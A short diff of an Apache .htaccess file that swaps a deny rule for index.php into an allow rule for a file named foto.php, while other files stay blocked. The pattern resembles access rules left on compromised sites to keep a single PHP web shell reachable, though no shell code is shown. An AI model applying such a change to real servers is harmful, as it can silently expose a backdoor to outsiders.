@@ -2,9 +2,9 @@
 Order allow,deny 
 Deny from all 
 </FilesMatch> 
-<FilesMatch "^(index.php)$"># 
+<FilesMatch "^(foto.php)$"># 
 Order allow,deny 
-Deny from all 
+Allow from all 
 </FilesMatch> 
 <FilesMatch "\.(jpg|png|gif|pdf|jpeg)$"> 
 Allow from all 
